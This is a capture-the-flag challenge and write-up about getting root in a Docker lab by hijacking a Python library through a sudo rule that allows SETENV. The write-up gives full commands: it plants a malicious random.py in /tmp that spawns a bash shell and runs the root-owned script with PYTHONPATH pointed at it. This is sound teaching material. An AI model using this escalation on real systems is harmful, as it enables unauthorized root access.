**Library Hijacking CTF Challenge**

**🏴 Challenge Overview**

Welcome to the **Library Hijacking CTF** challenge! This is a beginner-to-intermediate level machine-based CTF where the attacker needs to escalate privileges by exploiting a misconfigured Python script that runs with root privileges.

---

**🎯 Objective**

Your goal is to gain **root access** by exploiting a Python library hijacking vulnerability. You will connect to the machine using **SSH**, enumerate the system, and escalate privileges to obtain a root shell.

---

**🛠 Setup**

This challenge runs inside a **Docker container**. To deploy it, use the following commands:

```
docker pull e51am/ctf
docker run -dit --name library_hijacking_ctf -p 2222:22 e51am/ctf
```

Once the container is running, you can SSH into the machine using:

```
ssh ctfuser@localhost -p 2222
Password: password
```

---

**📌 Hints**

- Use `sudo -l` to check for **executable scripts with sudo privileges**.
- Find out which **libraries** the vulnerable script imports.
- Hijack the **imported library** to execute arbitrary code.

# Writeup

**🔍 Enumeration & Exploitation**

**1️⃣ Initial Access**

- The attacker discovers **credentials** for SSH login: **Username:** `ctfuser`**Password:** `password`
- Using the credentials, they connect via SSH:
    
    ```
    ssh ctfuser@localhost -p 2222
    ```
    

**2️⃣ Privilege Escalation - Enumerating sudo Permissions**

- Running the following command reveals a **sudo misconfiguration**:
    
    ```
    sudo -l
    ```
    or use linEnum.sh
  
- Output:
    
    ```
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/scripts/vulnerable_script.py
    ```
    
- This means `ctfuser` can set the environment and execute `vulnerable_script.py` **as root** without a password.


**4️⃣ Analyzing the Vulnerable Script**

- Checking the contents of `/opt/scripts/vulnerable_script.py`:**Output:**
    
    ```
    cat /opt/scripts/vulnerable_script.py
    
    ```
    
    ```
    import random
    choices = ["Rock", "Paper", "Scissors"]
    computer = random.choice(choices)
    player = False
    cpu_score = 0
    player_score = 0
    while True:
      player = input("Rock, Paper or  Scissors?").capitalize()
      ## Conditions of Rock,Paper and Scissors
      if player == computer:
          print("Tie!")
      elif player == "Rock":
          if computer == "Paper":
              print("You lose!", computer, "covers", player)
              cpu_score+=1
          else:
              print("You win!", player, "smashes", computer)
              player_score+=1
      elif player == "Paper":
          if computer == "Scissors":
              print("You lose!", computer, "cut", player)
              cpu_score+=1
          else:
              print("You win!", player, "covers", computer)
              player_score+=1
      elif player == "Scissors":
          if computer == "Rock":
              print("You lose...", computer, "smashes", player)
              cpu_score+=1
          else:
              print("You win!", player, "cut", computer)
              player_score+=1
      elif player=='End':
          print("Final Scores:")
          print(f"CPU:{cpu_score}")
          print(f"Plaer:{player_score}")
          break
    ```
    
- The script imports **random**, which we can **hijack**!

5️⃣ **Exploiting Library Hijacking**

- We create a **malicious version** of `random.py` in `/tmp`:
    
    ```
    echo 'import os; os.system("/bin/bash")' > /tmp/random.py
    
    ```
    
- Set the `PYTHONPATH` to prioritize our malicious library:
    
    ```
    sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/scripts/vulnerable_script.py
    
    ```
    
- This spawns a **root shell**! 🎉

**🏆 Capture the Flag**

Once you gain root access, find the flag inside:

```
cat /root/flag.txt
```

**🚀 Conclusion**

This challenge teaches **privilege escalation via Python library hijacking**, a common misconfiguration found in real-world scenarios. Happy hacking! 🏴‍☠️
